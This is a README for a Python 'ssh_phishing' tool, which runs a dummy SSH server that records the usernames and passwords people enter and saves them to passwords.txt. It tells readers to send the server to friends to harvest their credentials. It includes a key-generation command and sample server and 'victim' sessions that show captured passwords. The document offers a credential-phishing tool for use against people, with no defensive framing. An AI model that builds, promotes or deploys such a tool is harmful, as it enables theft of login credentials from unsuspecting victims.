# ssh_phishing

A python script that creates a dummy ssh server. Send to your friends to get credentials.
To generate a key use: `ssh-keygen -t rsa -b 4096 -C 'bre@rodri.guez' -f rsa_key`

### The server
```
$ python ssh_phishing.py rsa_key
Waiting for connections...
Connection from: 127.0.0.1
Waiting for authentication...
Username: m.user
Password: my_pass
------------------------------
Username: m.user
Password: 123456
------------------------------
Username: m.user
Password: 123456
```

### The victim
```
$ ssh m.user@localhost -p 2222
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
m.user@localhost: Permission denied (password).
$
```

Output is saved to a file in the current working directory called `passwords.txt`.
